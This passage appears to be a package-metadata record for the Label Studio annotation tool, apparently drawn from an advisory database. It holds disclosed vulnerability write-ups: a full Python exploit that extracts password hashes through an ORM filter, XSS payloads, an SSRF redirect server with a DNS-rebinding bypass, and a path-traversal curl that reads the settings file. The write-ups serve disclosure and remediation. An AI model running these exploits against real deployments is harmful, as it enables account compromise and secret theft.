annotated fields\n        \"\"\"\n        queryset = self.only_filtered(prepare_params=prepare_params)\n        return self.annotate_queryset(\n            queryset,\n            fields_for_evaluation=fields_for_evaluation,\n            all_fields=all_fields,\n            request=prepare_params.request\n        )\n\n    def only_filtered(self, prepare_params=None):\n        request = prepare_params.request\n        queryset = TaskQuerySet(self.model).filter(project=prepare_params.project) <1>\n        fields_for_filter_ordering = get_fields_for_filter_ordering(prepare_params)\n        queryset = self.annotate_queryset(queryset, fields_for_evaluation=fields_for_filter_ordering, request=request)\n        return queryset.prepared(prepare_params=prepare_params)\n```\n1. Special Django method for the `models.Manager` class that is used to retrieve the queryset for querying objects of a model.\n2. Uses the vulnerable `TaskQuerySet` that was explained above.\n\nThe following code snippet of the `Task` model in [`label_studio/tasks/models.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/models.py#L49C1-L102C102) shows that the vulnerable `PreparedTaskManager` is set as a class variable, along with the `updated_by` relational mapping to a Django user that will be exploited as the entrypoint of the filter chain.\n\n```python\n# ...\nclass Task(TaskMixin, models.Model):\n    \"\"\" Business tasks from project\n    \"\"\"\n    id = models.AutoField(auto_created=True, primary_key=True, serialize=False, verbose_name='ID', db_index=True)\n\n    # ...\n\n    updated_by = models.ForeignKey(settings.AUTH_USER_MODEL, related_name='updated_tasks',\n        on_delete=models.SET_NULL, null=True, verbose_name=_('updated by'),\n        help_text='Last annotator or reviewer who updated this task') <1>\n\n    # ...\n\n    objects = TaskManager()  # task manager by default\n    prepared = PreparedTaskManager()  # task manager with filters, ordering, etc for data_manager app <2>\n\n    # ...\n```\n1. The entry point of the filter chain to filter by the `updated_by__active_organization__active_users__password`.\n2. The vulnerable `PreparedTaskManager` being set that will be exploited.\n\nFinally, the `TaskListAPI` view set in [`label_studio/tasks/api.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/tasks/api.py#L205) with the `/api/tasks` API endpoint uses the vulnerable `PreparedTaskManager` to filter `Task` objects.\n\n```python\n    def get_queryset(self):\n        task_id = self.request.parser_context['kwargs'].get('pk')\n        task = generics.get_object_or_404(Task, pk=task_id)\n        review = bool_from_request(self.request.GET, 'review', False)\n        selected = {\"all\": False, \"included\": [self.kwargs.get(\"pk\")]}\n        if review:\n            kwargs = {\n                'fields_for_evaluation': ['annotators', 'reviewed']\n            }\n        else:\n            kwargs = {'all_fields': True}\n        project = self.request.query_params.get('project') or self.request.data.get('project')\n        if not project:\n            project = task.project.id\n        return self.prefetch(\n            Task.prepared.get_queryset(\n                prepare_params=PrepareParams(project=project, selectedItems=selected, request=self.request),\n                **kwargs\n            )) <1>\n```\n1. Uses the vulnerable `PreparedTaskManager` to filter objects.\n\n# Proof of Concept\n\nBelow are the steps to exploit about how to exploit this vulnerability to leak the password hash of an account on Label Studio.\n\n1. Create two accounts on Label Studio and choose one account to be the victim and the other the hacker account that you will use.\n2. Create a new project or use an existing project, then add a task to the project. Update the task with the hacker account to cause the entry point of the filter chain.\n3. Navigate to the task view for the project and add any filter with the `Network` inspect tab open on the browser. Look for a `PATCH` request to `/api/dm/views/{view_id}?interaction=filter&project={project_id}` and save the `view_id` and `project_id` for the next step.\n4. Download the attached proof of concept exploit script named `labelstudio_ormleak.py`. This script will leak the password hash of the victim account character by character. Run the following command to run the exploit script, replacing the `{view_id}`, `{project_id}`, `{cookie_str}` and `{url}` with the corresponding values. For further explanation run `python3 labelstudio_ormleak.py --help`.\n\n```bash\npython3 labelstudio_ormleak.py -v {view_id} -p {project_id} -c '{cookie_str}' -u '{url}'\n```\n\nThe following example GIF demonstrates exploiting this ORM Leak vulnerability to retrieve the password hash `pbkdf2_sha256$260000$KKeew1othBwMKk2QudmEgb$ALiopdBpWMwMDD628xeE1Ie7YSsKxdXdvWfo/PvVXvw=`.\n\n![labelstudio_ormleak_poc](https://user-images.githubusercontent.com/139727151/266986646-a3d1367c-fb4d-4482-9b6a-18a5d7316385.gif)\n\n# Impact\n\nThis vulnerability can be exploited to completely compromise the confidentiality of highly sensitive account information, such as account password hashes. For all versions `<=1.8.1`, this finding can also be chained with hard coded `SECRET_KEY` to forge session tokens of any user on Label Studio and could be abuse to deteriorate the integrity and availability.\n\n# Remediation Advice\n\n* Do not use unsanitised values for constructing a filter for querying objects using Django's ORM. Django's ORM allows querying by relation field and performs auto lookups, that enable filtering by sensitive fields.\n* Validate filter values to an allow list before performing any queries.\n\n# Discovered\n- August 2023, Alex Brown, elttam\n\n---\n# `labelstudio_ormleak.py` proof of concept\n\n```py\nimport argparse\nimport re\nimport requests\nimport string\nimport sys\n\n# Password hash characters\nCHARS = string.ascii_letters + string.digits + '$/+=_!'\nCHARS_LEN = len(CHARS)\n\nPAYLOAD = {\n    \"data\": {\n        \"columnsDisplayType\": {},\n        \"columnsWidth\": {},\n        \"filters\": {\n            \"conjunction\": \"and\",\n            \"items\": [\n                {\n                    \"filter\": \"filter:tasks:updated_by__active_organization__active_users__password\", # ORM Leak filter chain\n                    \"operator\": \"regex\", # Use regex operator to filter password hash value\n                    \"type\": \"String\",\n                    \"value\": \"REPLACEME\"\n                }\n            ]\n        },\n        \"gridWidth\": 4,\n        \"hiddenColumns\":{\"explore\":[\"tasks:inner_id\"],\"labeling\":[\"tasks:id\",\"tasks:inner_id\"]},\n        \"ordering\": [],\n        \"search_text\": None,\n        \"target\": \"tasks\",\n        \"title\": \"Default\",\n        \"type\": \"list\"\n    },\n    \"id\": 1, # View ID\n    \"project\": \"1\" # Project ID\n}\n\ndef parse_args() -> argparse.Namespace:\n    parser = argparse.ArgumentParser(\n        description='Leak an accounts password hash by exploiting a ORM Leak vulnerability in Label Studio'\n    )\n\n    parser.add_argument(\n        '-v', '--view-id',\n        help='View id of the page',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-p', '--project-id',\n        help='Project id to filter tasks for',\n        type=int,\n        required=True\n    )\n\n    parser.add_argument(\n        '-c', '--cookie-str',\n        help='Cookie string for authentication',\n        required=True\n    )\n\n    parser.add_argument(\n        '-u', '--url',\n        help='Base URL to Label Studio instance',\n        required=True\n    )\n\n    return parser.parse_args()\n\ndef setup() -> dict:\n    args = parse_args()\n    view_id = args.view_id\n    project_id = args.project_id\n    path_1 = \"/api/dm/views/{view_id}?interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    path_2 = \"/api/tasks?page=1&page_size=1&view={view_id}&interaction=filter&project={project_id}\".format(\n        view_id=view_id,\n        project_id=project_id\n    )\n    PAYLOAD[\"id\"] = view_id\n    PAYLOAD[\"project\"] = str(project_id)\n    \n    config_dict = {\n        'COOKIE_STR': args.cookie_str,\n        'URL_PATH_1': args.url + path_1,\n        'URL_PATH_2': args.url + path_2,\n        'PAYLOAD': PAYLOAD\n    }\n    return config_dict\n\ndef test_payload(config_dict: dict, payload) -> bool:\n    sys.stdout.flush()\n    cookie_str = config_dict[\"COOKIE_STR\"]\n    r_set = requests.patch(\n        config_dict[\"URL_PATH_1\"],\n        json=payload,\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_listen = requests.get(\n        config_dict['URL_PATH_2'],\n        headers={\n            \"Cookie\": cookie_str\n        }\n    )\n\n    r_json = r_listen.json()\n    return len(r_json[\"tasks\"]) >= 1\n\ndef test_char(config_dict, known_hash, c):\n    json_payload_suffix = PAYLOAD\n    test_escaped = re.escape(known_hash + c)\n    json_payload_suffix[\"data\"][\"filters\"][\"items\"][0][\"value\"] =  f\"^{test_escaped}\"\n\n    suffix_result = test_payload(config_dict, json_payload_suffix)\n    if suffix_result:\n        return (known_hash + c, c)\n    \n    return None\n\ndef main():\n    config_dict = setup()\n    # By default Label Studio password hashes start with these characters\n    known_hash = \"pbkdf2_sha256$260000$\"\n    print()\n    print(f\"dumped: {known_hash}\", end=\"\")\n    sys.stdout.flush()\n\n    while True:\n        found = False\n\n        for c in CHARS:\n            r = test_char(config_dict, known_hash, c)\n            if not r is None:\n                new_hash, c = r\n                known_hash = new_hash\n                print(c, end=\"\")\n                sys.stdout.flush()\n                found = True\n                break\n\n        if not found:\n            break\n\n    print()\n\nif __name__ == \"__main__\":\n    main()\n```","fixed_in":["1.9.2.post0"],"id":"GHSA-6hjj-gq77-j4qw","link":"https://osv.dev/vulnerability/GHSA-6hjj-gq77-j4qw","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-26152"],"details":"### Summary\nOn all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a [`Choices`](https://labelstud.io/tags/choices) or [`Labels`](https://labelstud.io/tags/labels) tag, resulting in an XSS vulnerability.\n\n### Details\nNeed permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.\n\n### PoC\n\n1. Create a project.\n![Create a project](https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673)\n\n2. Upload a file containing the payload using the \"Upload Files\" function.\n![2  Upload a file containing the payload using the Upload Files function](https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328)\n![3  complete](https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e)\n\nThe following are the contents of the files used in the PoC\n```\n{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"<img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)>\"\n      }\n    ]\n  }\n}\n```\n\n3. Select the text-to-image generation labeling template of Ranking and scoring\n![3  Select the text-to-image generation labelling template for Ranking and scoring](https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155)\n![5  save](https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d)\n\n4. Select a task\n![4  Select a task](https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7)\n\n5. Check that the script is running\n![5  Check that the script is running](https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9)\n\n### Impact\nMalicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.\n","fixed_in":["1.11.0"],"id":"GHSA-6xv9-957j-qfhg","link":"https://osv.dev/vulnerability/GHSA-6xv9-957j-qfhg","source":"osv","summary":null,"withdrawn":null}]},"1.5.0.post0":{"info":{"author":"Heartex","author_email":"hello@heartex.ai","bugtrack_url":null,"classifiers":["License :: OSI Approved :: Apache Software License","Operating System :: OS Independent","Programming Language :: Python :: 3"],"description_content_type":"text/markdown","docs_url":null,"download_url":"","downloads":{"last_day":-1,"last_month":-1,"last_week":-1},"dynamic":null,"home_page":"https://github.com/heartexlabs/label-studio","keywords":"","license":"","maintainer":"","maintainer_email":"","name":"label-studio","package_url":"https://pypi.org/project/label-studio/","platform":null,"project_url":"https://pypi.org/project/label-studio/","project_urls":{"Homepage":"https://github.com/heartexlabs/label-studio"},"provides_extra":null,"release_url":"https://pypi.org/project/label-studio/1.5.0.post0/","requires_dist":["wheel","appdirs (>=1.4.3)","attr (==0.3.1)","attrs (>=19.2.0)","pyyaml (>=5.3.1)","azure-storage-blob (>=12.6.0)","boto (~=2.49.0)","boto3 (~=1.16.28)","botocore (~=1.19.28)","google-api-core (==1.31.5)","google-auth (==1.35.0)","google-cloud-appengine-logging (==1.1.0)","google-cloud-audit-log (==0.2.0)","google-cloud-core (==1.5.0)","google-cloud-storage (~=1.29.0)","google-cloud-logging (~=2.7.0)","google-resumable-media (==0.5.1)","googleapis-common-protos (==1.52.0)","grpc-google-iam-v1 (==0.12.3)","Django (==3.1.14)","django-annoying (==0.10.6)","django-debug-toolbar (==3.2.1)","django-filter (==2.4.0)","django-model-utils (==4.1.1)","django-rq (==2.5.1)","django-cors-headers (==3.6.0)","django-extensions (==3.1.0)","django-rest-swagger (==2.2.0)","django-user-agents (==0.4.0)","django-ranged-fileresponse (>=0.1.2)","drf-dynamic-fields (==0.3.0)","drf-flex-fields (==0.9.5)","drf-yasg (==1.20.0)","drf-generators (==0.3.0)","htmlmin (==0.1.12)","jsonschema (==3.2.0)","lockfile (>=0.12.0)","lxml (>=4.2.5)","defusedxml (>=0.7.1)","numpy (>=1.19.1)","ordered-set (==4.0.2)","pandas (>=0.24.0)","protobuf (>=3.15.5)","psycopg2-binary (==2.9.1)","pydantic (<=1.8.2,>=1.7.3)","python-dateutil (==2.8.1)","pytz (==2019.3)","requests (<2.28,>=2.22.0)","rq (==1.10.1)","rules (==2.2)","ujson (>=3.0.0)","xmljson (==0.2.0)","colorama (>=0.4.4)","boxing (>=0.1.4)","redis (>=4.2.0)","sentry-sdk (>=1.1.0)","launchdarkly-server-sdk (==7.3.0)","label-studio-converter (==0.0.40)","label-studio-tools (==0.0.0.dev14)","mysqlclient ; extra == 'mysql'"],"requires_python":">=3.6","summary":"Label Studio annotation tool","version":"1.5.0.post0","yanked":false,"yanked_reason":null},"last_serial":25820833,"urls":[{"comment_text":"","digests":{"blake2b_256":"cda9e6165a4ab6d5a9d599857bc47357e04872a8d30e4f25369217e3ed427a52","md5":"61315653243cb0e688c2104aad24830a","sha256":"59ffa58cdbedefcb79e63d9db966de7b64c19be8a501454575bf52c25d952ad0"},"downloads":-1,"filename":"label_studio-1.5.0.post0-py3-none-any.whl","has_sig":false,"md5_digest":"61315653243cb0e688c2104aad24830a","packagetype":"bdist_wheel","python_version":"py3","requires_python":">=3.6","size":41632554,"upload_time":"2022-07-13T16:52:35","upload_time_iso_8601":"2022-07-13T16:52:35.781821Z","url":"https://files.pythonhosted.org/packages/cd/a9/e6165a4ab6d5a9d599857bc47357e04872a8d30e4f25369217e3ed427a52/label_studio-1.5.0.post0-py3-none-any.whl","yanked":false,"yanked_reason":null},{"comment_text":"","digests":{"blake2b_256":"5aa0895a419ce4ce3dd1e5f4631380561ee57ace2a1073ae4dd94c1ff8f97cd0","md5":"e2271a182817e9f090ffcfb6a481de44","sha256":"a7fd5fa69d28cc39f032ea4ecbd0fa77adb519b365605f86ee6ff969f56856a9"},"downloads":-1,"filename":"label-studio-1.5.0.post0.tar.gz","has_sig":false,"md5_digest":"e2271a182817e9f090ffcfb6a481de44","packagetype":"sdist","python_version":"source","requires_python":">=3.6","size":40702349,"upload_time":"2022-07-13T16:52:40","upload_time_iso_8601":"2022-07-13T16:52:40.215278Z","url":"https://files.pythonhosted.org/packages/5a/a0/895a419ce4ce3dd1e5f4631380561ee57ace2a1073ae4dd94c1ff8f97cd0/label-studio-1.5.0.post0.tar.gz","yanked":false,"yanked_reason":null}],"vulnerabilities":[{"aliases":["CVE-2022-36551"],"details":"A Server Side Request Forgery (SSRF) in the Data Import module in Heartex - Label Studio Community Edition versions 1.5.0 and earlier allows an authenticated user to access arbitrary files on the system. Furthermore, self-registration is enabled by default in these versions of Label Studio enabling a remote attacker to create a new account and then exploit the SSRF. This issue is fixed in version 1.6.0.","fixed_in":["1.6.0"],"id":"GHSA-pc6f-259w-w3j6","link":"https://osv.dev/vulnerability/GHSA-pc6f-259w-w3j6","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47116"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to [`1.11.0`](https://github.com/HumanSignal/label-studio/releases/tag/1.11.0) and was tested on version `1.8.2`.\n\n# Overview\n\nLabel Studio's SSRF protections that can be enabled by setting the `SSRF_PROTECTION_ENABLED` environment variable can be bypassed to access internal web servers. This is because the current SSRF validation is done by executing a single DNS lookup to verify that the IP address is not in an excluded subnet range. This protection can be bypassed by either using HTTP redirection or performing a [DNS rebinding attack](https://en.wikipedia.org/wiki/DNS_rebinding).\n\n# Description\n\nThe following `tasks_from_url` method in [`label_studio/data_import/uploader.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/data_import/uploader.py#L127-L155) performs the SSRF validation (`validate_upload_url`) before sending the request.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1]\n\n        validate_upload_url(url, block_local_urls=settings.SSRF_PROTECTION_ENABLED)\n        # Reason for #nosec: url has been validated as SSRF safe by the\n        # validation check above.\n        response = requests.get(\n            url, verify=False, headers={'Accept-Encoding': None}\n        )  # nosec\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(\n            user, project, SimpleUploadedFile(filename, file_content)\n        )\n        if file_upload.format_could_be_tasks_list:\n            could_be_tasks_list = True\n        file_upload_ids.append(file_upload.id)\n        tasks, found_formats, data_keys = FileUpload.load_tasks_from_uploaded_files(\n            project, file_upload_ids\n        )\n\n    except ValidationError as e:\n        raise e\n    except Exception as e:\n        raise ValidationError(str(e))\n    return data_keys, found_formats, tasks, file_upload_ids, could_be_tasks_list\n```\n\nThe `validate_upload_url` code in [`label_studio/core/utils/io.py`](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/core/utils/io.py#L174-L209) is shown below.\n\n```python\ndef validate_upload_url(url, block_local_urls=True):\n    \"\"\"Utility function for defending against SSRF attacks. Raises\n        - InvalidUploadUrlError if the url is not HTTP[S], or if block_local_urls is enabled\n          and the URL resolves to a local address.\n        - LabelStudioApiException if the hostname cannot be resolved\n\n    :param url: Url to be checked for validity/safety,\n    :param block_local_urls: Whether urls that resolve to local/private networks should be allowed.\n    \"\"\"\n\n    parsed_url = parse_url(url)\n\n    if parsed_url.scheme not in ('http', 'https'):\n        raise InvalidUploadUrlError\n\n    domain = parsed_url.host\n    try:\n        ip = socket.gethostbyname(domain)\n    except socket.error:\n        from core.utils.exceptions import LabelStudioAPIException\n        raise LabelStudioAPIException(f\"Can't resolve hostname {domain}\")\n\n    if not block_local_urls:\n        return\n\n    if ip == '0.0.0.0':  # nosec\n        raise InvalidUploadUrlError\n    local_subnets = [\n        '127.0.0.0/8',\n        '10.0.0.0/8',\n        '172.16.0.0/12',\n        '192.168.0.0/16',\n    ]\n    for subnet in local_subnets:\n        if ipaddress.ip_address(ip) in ipaddress.ip_network(subnet):\n            raise InvalidUploadUrlError\n```\n\nThe issue here is the SSRF validation is only performed before the request is sent, and does not validate the destination IP address. Therefore, an attacker can either redirect the request or perform a DNS rebinding attack to bypass this protection.\n\n# Proof of Concept\n\nBoth the HTTP redirection and DNS rebinding methods for bypassing Label Studio's SSRF protections are explained below.\n\n### HTTP Redirection\n\nThe python `requests` module automatically follows HTTP redirects (eg. response code `301` and `302`). Therefore, an attacker could use a URL shortener (eg. `https://www.shorturl.at/`) or host the following Python code on an external server to redirect request from a Label Studio server to an internal web server.\n\n```python\nfrom http.server import BaseHTTPRequestHandler, HTTPServer\n\nclass RedirectHandler(BaseHTTPRequestHandler):\n\n    def do_GET(self):\n        self.send_response(301)\n        # skip first slash\n        self.send_header('Location', self.path[1:])\n        self.end_headers()\n\nHTTPServer((\"\", 8080), RedirectHandler).serve_forever()\n```\n\n### DNS Rebinding Attack\n\nDNS rebinding can bypass SSRF protections by resolving to an external IP address for the first resolution, but when the request is sent resolves to an internal IP address that is blocked. For an example, the domain `7f000001.030d1fd6.rbndr.us` will randomly switch between the IP address `3.13.31.214` that is not blocked to `127.0.0.1` which is not allowed.\n\n# Impact\n\nSSRF vulnerabilities pose a significant risk on cloud environments, since instance credentials are managed by internal web APIs. An attacker can bypass Label Studio's SSRF protections to access internal web servers and partially compromise the confidentiality of those internal servers.\n\n# Remediation Advice\n\n* Before saving any responses, validate the destination IP address is not in the deny list.\n* Consider blocking internal cloud API IP ranges to mitigate the risk of compromising cloud credentials.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.11.0"],"id":"GHSA-p59w-9gqw-wj8r","link":"https://osv.dev/vulnerability/GHSA-p59w-9gqw-wj8r","source":"osv","summary":null,"withdrawn":null},{"aliases":[],"details":"### Summary\nThe vulnerability resides on the Nginx config file:\nhttps://github.com/heartexlabs/label-studio/blob/53944e6bcede75ca5c102d655013f2e5238e85e6/deploy/default.conf#L119\n\nThe pattern on location /static indicates a popular misconfiguration on Nginx servers presented in 2018 originally by Orange Tsai. This vulnerability allows an attacker to use a single path traversal payload in the matched location to traverse one directory above. This vulnerability only happens due to the location /static directive not having a slash `/` at the end, the following code shows an example of a safe configuration:\n```nginx\nlocation /static/ {\n[...]\n```\nThe vulnerability works because Nginx will think that `/static../` is a directory that should also be aliased to the folder, allowing /static/../ to be reached. In Label Studio's case, this means all files on /label_studio/core/ are exposed.\n\nOf course, this means that only Label Studio instances that were deployed using the default nginx files introducted at Mar 31, 2021.\nThis is a very easy vulnerability to fix, and just a lesser-known configuration mistake on nginx files. It's very easy to happen because all is needed is for one slash to be missing. (Off-By-One)\n\n** Proof-of-Concept (Leaking Secret Keys): **\nExploiting this vulnerability usually depends on what's on the parent folder, in Label Studio's case the most interesting file I could find that's on there by default is /label_studio/core/ . We can fetch it by simply making a request to the traversed folder.\n```bash\n# Production Label Studio docker-compose running on localhost:8080\n/t/mydata [127]$ curl localhost:8080/static../settings/label_studio.py\n\"\"\"This file and its contents are licensed under the Apache License 2.0. Please see the included NOTICE for copyright information and LICENSE for a copy of the license.\n\"\"\"\nimport os\nimport pathlib\n\nfrom core.settings.base import *\n\nDJANGO_DB = get_env('DJANGO_DB', DJANGO_DB_SQLITE)\nDATABASES = {'default': DATABASES_ALL[DJANGO_DB]}\n\nMIDDLEWARE.append('organizations.middleware.DummyGetSessionMiddleware')\nMIDDLEWARE.append('core.middleware.UpdateLastActivityMiddleware')\nif INACTIVITY_SESSION_TIMEOUT_ENABLED:\n    MIDDLEWARE.append('core.middleware.InactivitySessionTimeoutMiddleWare')\n\nADD_DEFAULT_ML_BACKENDS = False\n\nLOGGING['root']['level'] = get_env('LOG_LEVEL', 'WARNING')\n\nDEBUG = get_bool_env('DEBUG', False)\n\nDEBUG_PROPAGATE_EXCEPTIONS = get_bool_env('DEBUG_PROPAGATE_EXCEPTIONS', False)\n\nSESSION_COOKIE_SECURE = False\n\nSESSION_ENGINE = \"django.contrib.sessions.backends.signed_cookies\"\n\nRQ_QUEUES = {}\n\nSENTRY_DSN = get_env(\n    'SENTRY_DSN',\n    'https://68b045ab408a4d32a910d339be8591a4@o227124.ingest.sentry.io/5820521'\n)\nSENTRY_ENVIRONMENT = get_env('SENTRY_ENVIRONMENT', 'opensource')\n\nFRONTEND_SENTRY_DSN = get_env(\n    'FRONTEND_SENTRY_DSN',\n    'https://5f51920ff82a4675a495870244869c6b@o227124.ingest.sentry.io/5838868')\nFRONTEND_SENTRY_ENVIRONMENT = get_env('FRONTEND_SENTRY_ENVIRONMENT', 'opensource')\n\nEDITOR_KEYMAP = json.dumps(get_env(\"EDITOR_KEYMAP\"))\n\nfrom label_studio import __version__\nfrom label_studio.core.utils import sentry\nsentry.init_sentry(release_name='label-studio', release_version=__version__)\n\n# we should do it after sentry init\nfrom label_studio.core.utils.common import collect_versions\nversions = collect_versions()\n\n# in Label Studio Community version, feature flags are always ON\nFEATURE_FLAGS_DEFAULT_VALUE = True\n# or if file is not set, default is using offline mode\nFEATURE_FLAGS_OFFLINE = get_bool_env('FEATURE_FLAGS_OFFLINE', True)\n\nfrom core.utils.io import find_file\nFEATURE_FLAGS_FILE = get_env('FEATURE_FLAGS_FILE', 'feature_flags.json')\nFEATURE_FLAGS_FROM_FILE = True\ntry:\n    from core.utils.io import find_node\n    find_node('label_studio', FEATURE_FLAGS_FILE, 'file')\nexcept IOError:\n    FEATURE_FLAGS_FROM_FILE = False\n\nSTORAGE_PERSISTENCE = get_bool_env('STORAGE_PERSISTENCE', True)\n```\n\n\n### Impact\nThe impact consists on leaking Django secret keys by default, with also greater risk being possible due to the vulnerability exposing the file located at /label_studio/core/settings/label_studio.py which contains the secret key for Django as well as possibly containing other secrets the user might put there. (If the administrator decides not to use environment variables for some variables)\n","fixed_in":["1.7.2"],"id":"GHSA-cpmr-mw4j-99r7","link":"https://osv.dev/vulnerability/GHSA-cpmr-mw4j-99r7","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2023-47115"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.9.2` and was tested on version `1.8.2`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) has a cross-site scripting (XSS) vulnerability that could be exploited when an authenticated user uploads a crafted image file for their avatar that gets rendered as a HTML file on the website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/functions.py#L18-L49) shows that the only verification check is that the file is an image by extracting the dimensions from the file.\n\n```python\n\ndef hash_upload(instance, filename):\n    filename = str(uuid.uuid4())[0:8] + '-' + filename\n    return settings.AVATAR_PATH + '/' + filename <3>\n\n\ndef check_avatar(files):\n    images = list(files.items())\n    if not images:\n        return None\n\n    filename, avatar = list(files.items())[0]  # get first file\n    w, h = get_image_dimensions(avatar) <1>\n    if not w or not h:\n        raise forms.ValidationError(\"Can't read image, try another one\")\n\n    # validate dimensions\n    max_width = max_height = 1200\n    if w > max_width or h > max_height:\n        raise forms.ValidationError('Please use an image that is %s x %s pixels or smaller.'\n                                    % (max_width, max_height))\n\n    # validate content type\n    main, sub = avatar.content_type.split('/') <2>\n    if not (main == 'image' and sub.lower() in ['jpeg', 'jpg', 'gif', 'png']):\n        raise forms.ValidationError(u'Please use a JPEG, GIF or PNG image.')\n\n    # validate file size\n    max_size = 1024 * 1024\n    if len(avatar) > max_size:\n        raise forms.ValidationError('Avatar file size may not exceed ' + str(max_size/1024) + ' kb')\n\n    return avatar\n```\n1. Attempts to get image dimensions to validate the uploaded avatar file is an image.\n2. Extracts the `Content-Type` from the upload `POST` request. A user can easily bypass this verification by changing the mimetype of the uploaded file to an allowed type (eg. `image/jpeg`).\n3. The file extension of the uploaded file is never validated and is saved to the filesystem.\n\n[Label Studio serves avatar images using Django's built-in `serve` view](https://github.com/HumanSignal/label-studio/blob/1.8.2/label_studio/users/urls.py#L25-L26), which is [not secure for production use according to Django's documentation](https://docs.djangoproject.com/en/4.2/ref/views/#serving-files-in-development).\n\n```python\n    re_path(r'^data/' + settings.AVATAR_PATH + '/(?P<path>.*)$', serve,\n            kwargs={'document_root': join(settings.MEDIA_ROOT, settings.AVATAR_PATH)}),\n```\n\nThe issue with the Django `serve` view is that it determines the `Content-Type` of the response by the file extension in the URL path. Therefore, an attacker can upload an image that contains malicious HTML code and name the file with a `.html` extension to be rendered as a HTML page. The only file extension validation is performed on the client-side, which can be easily bypassed.\n\n# Proof of Concept\n\nBelow are the steps to reproduce this issue and execute JavaScript code in the context of the Label Studio website.\n\n1. Using any JPEG or PNG image, add in the comment field in the metadata the HTML code `<script>alert(document.domain)</script>`. This can be done using the `exiftool` command as shown below that was used to create the following image.\n\n```bash\nexiftool -Comment='<script>alert(document.domain)</script>' penguin.jpg\n```\n\n![xss-penguin](https://user-images.githubusercontent.com/139727151/266989884-c2cd9b4f-f374-416e-a468-acf41f52e088.jpg)\n\n2. On Label Studio, navigate to account & settings page and intercept the upload request of the avatar image using a tool such as Burp Suite. Modify the filename in the request to have a `.html` extension.\n\n3. Right click the image on the avatar profile and copy the URL. Send this to a victim and it will display an alert box with the host name of the Label Studio instance as shown below.\n\n![xss-alert](https://user-images.githubusercontent.com/139727151/266989952-6fb74c6e-9961-447c-a602-5a6f36627ae6.png)\n\n# Impact\n\nExecuting arbitrary JavaScript could result in an attacker performing malicious actions on Label Studio users if they visit the crafted avatar image. For an example, an attacker can craft a JavaScript payload that adds a new Django Super Administrator user if a Django administrator visits the image.\n\n# Remediation Advice\n\n* Validate the file extension on the server side, not in client-side code.\n* Remove the use of Django's `serve` view and implement a secure controller for viewing uploaded avatar images.\n* Consider saving file content in the database rather than on the filesystem to mitigate against other file related vulnerabilities.\n* Avoid trusting user controlled inputs.\n\n# Discovered\n- August 2023, Alex Brown, elttam","fixed_in":["1.9.2"],"id":"GHSA-q68h-xwq5-mm7x","link":"https://osv.dev/vulnerability/GHSA-q68h-xwq5-mm7x","source":"osv","summary":null,"withdrawn":null},{"aliases":["CVE-2024-23633"],"details":"# Introduction\n\nThis write-up describes a vulnerability found in [Label Studio](https://github.com/HumanSignal/label-studio), a popular open source data labeling tool. The vulnerability affects all versions of Label Studio prior to `1.10.1` and was tested on version `1.9.2.post0`.\n\n# Overview\n\n[Label Studio](https://github.com/HumanSignal/label-studio) had a remote import feature allowed users to import data from a remote web source, that was downloaded and could be viewed on the website. This feature could had been abused to download a HTML file that executed malicious JavaScript code in the context of the Label Studio website.\n\n# Description\n\nThe following [code snippet in Label Studio](https://github.com/HumanSignal/label-studio/blob/1.9.2.post0/label_studio/data_import/uploader.py#L125C5-L146) showed that is a URL passed the SSRF verification checks, the contents of the file would be downloaded using the filename in the URL.\n\n```python\ndef tasks_from_url(file_upload_ids, project, user, url, could_be_tasks_list):\n    \"\"\"Download file using URL and read tasks from it\"\"\"\n    # process URL with tasks\n    try:\n        filename = url.rsplit('/', 1)[-1] <1>\n\n        response = ssrf_safe_get(\n            url, verify=project.organization.should_verify_ssl_certs(), stream=True, headers={'Accept-Encoding': None}\n        )\n        file_content = response.content\n        check_tasks_max_file_size(int(response.headers['content-length']))\n        file_upload = create_file_upload(user, project, SimpleUploadedFile(filename, 